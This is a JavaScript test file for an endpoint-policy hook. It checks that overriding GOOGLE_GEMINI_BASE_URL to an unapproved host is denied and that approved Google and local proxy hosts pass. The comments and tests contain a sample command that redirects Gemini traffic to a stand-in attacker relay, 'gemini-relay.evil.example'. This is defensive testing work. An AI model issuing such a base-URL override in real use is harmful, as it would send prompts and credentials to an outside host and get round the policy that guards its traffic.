// #63 "Unapproved model endpoint" — GOOGLE_GEMINI_BASE_URL. The Gemini CLI and the Google Gen AI SDKs
// read it as the API base URL (the model proxy's own help points them at it), so an override that sends
// Gemini traffic to an unapproved host must be caught like ANTHROPIC_BASE_URL / GOOGLE_VERTEX_BASE_URL.
// Before the fix the variable was not in BASE_URL_ENV_VARS and a non-LLM relay host passed:
//   GOOGLE_GEMINI_BASE_URL=https://gemini-relay.evil.example gemini -p hi  ->  allow, hosts=[]
//
//   node --test --import ./test/hermetic-env.mjs test/gemini-base-url.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { decideEndpoints } from "../cli/hook-core.mjs";
import { BASE_URL_ENV_VARS, extractEndpointHosts } from "../data/model-endpoints.js";

const POLICY = { endpointAllow: ["googleapis.com", "127.0.0.1"] };

test("FIRES: a Gemini base-URL override to an unapproved host is denied", () => {
  assert.ok(BASE_URL_ENV_VARS.includes("GOOGLE_GEMINI_BASE_URL"));
  const d = decideEndpoints(POLICY, "GOOGLE_GEMINI_BASE_URL=https://gemini-relay.evil.example gemini -p hi");
  assert.equal(d.decision, "deny");
  assert.deepEqual(d.hosts, ["gemini-relay.evil.example"]);
  assert.deepEqual(extractEndpointHosts("export GOOGLE_GEMINI_BASE_URL='https://gemini-relay.evil.example/v1beta'"), ["gemini-relay.evil.example"]);
});

test("QUIET: the approved Google endpoint and the local model proxy pass", () => {
  assert.equal(decideEndpoints(POLICY, "GOOGLE_GEMINI_BASE_URL=https://generativelanguage.googleapis.com gemini -p hi").decision, "allow");
  assert.equal(decideEndpoints(POLICY, "GOOGLE_GEMINI_BASE_URL=http://127.0.0.1:8791/gemini gemini -p hi").decision, "allow");
  // No endpointAllow configured: the rule does not enforce at all, exactly as for the other variables.
  assert.equal(decideEndpoints({}, "GOOGLE_GEMINI_BASE_URL=https://gemini-relay.evil.example gemini -p hi").decision, "allow");
});
